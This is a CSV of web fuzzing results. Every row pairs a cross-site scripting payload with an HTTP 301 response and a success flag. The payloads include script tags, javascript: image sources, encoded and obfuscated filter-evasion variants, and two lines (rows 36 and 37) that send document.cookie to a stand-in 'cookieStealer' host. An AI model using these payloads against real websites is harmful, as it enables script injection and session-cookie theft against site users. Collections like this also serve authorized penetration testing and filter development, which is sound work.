id,response,lines,word,chars,request,success
22,301,6,14,288,"<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>",1
23,301,6,14,284,<IMG%20SRC='javasc	ript:alert(document.cookie)'>,1
26,301,6,14,242,"<IMG%20SRC=""jav&#x0A;ascript:alert('WXSS');"">",1
1,301,6,14,246,"""><script>""",1
27,301,6,14,242,"<IMG%20SRC=""jav&#x0D;ascript:alert('WXSS');"">",1
21,301,6,14,294,"<IMG%20""""""><SCRIPT>alert(""WXSS"")</SCRIPT>"">",1
3,301,6,14,276,"<<script>alert(""WXSS"");//<</script>",1
20,301,6,14,281,"<IMG%20SRC=`javascript:alert(""'WXSS'"")`>",1
15,301,6,14,280,"<IMG%20SRC=""javascript:alert('WXSS');"">",1
25,301,6,14,242,"<IMG%20SRC=""jav&#x09;ascript:alert('WXSS');"">",1
19,301,6,14,285,<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>,1
18,301,6,14,273,<IMG%20SRC=JaVaScRiPt:alert('WXSS')>,1
17,301,6,14,273,<IMG%20SRC=javascript:alert('WXSS')>,1
14,301,6,14,284,<IMG%20SRC='javascript:alert(document.cookie)'>,1
13,301,6,14,297,<xss><script>alert('WXSS')</script></vulnerable>,1
16,301,6,14,276,"<IMG%20SRC=""javascript:alert('WXSS')""",1
12,301,6,14,297,&ltscript&gtalert(document.cookie);&ltscript&gtalert,1
11,301,6,14,283,&ltscript&gtalert(document.cookie);</script>,1
10,301,6,14,270,%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E,1
6,301,6,14,281,'><script>alert(document.cookie);</script>,1
9,301,6,14,275,%3cscript%3ealert(document.cookie);%3c%2fscript%3e,1
8,301,6,14,268,"%3cscript%3ealert(""WXSS"");%3c/script%3e",1
5,301,6,14,280,'><script>alert(document.cookie)</script>,1
2,301,6,14,267,"<script>alert(""WXSS"")</script>",1
4,301,6,14,272,<script>alert(document.cookie)</script>,1
28,301,6,14,242,"<IMG%20SRC=""%20&#14;%20javascript:alert('WXSS');"">",1
30,301,6,14,282,"<IMG%20LOWSRC=""javascript:alert('WXSS')"">",1
33,301,6,14,236,<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
34,301,6,14,236,<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
32,301,6,14,236,<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
29,301,6,14,282,"<IMG%20DYNSRC=""javascript:alert('WXSS')"">",1
31,301,6,14,323,<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>,1
35,301,6,14,293,'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E,1
37,301,6,14,369,%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E,1
36,301,6,14,340,"""><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>",1
38,301,6,14,488,"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",1
39,301,6,14,262,"'';!--""<XSS>=&{()}",1
24,301,6,14,280,"<IMG%20SRC=""jav	ascript:alert('WXSS');"">",1
7,301,6,14,253,"\"";alert('XSS');//",1
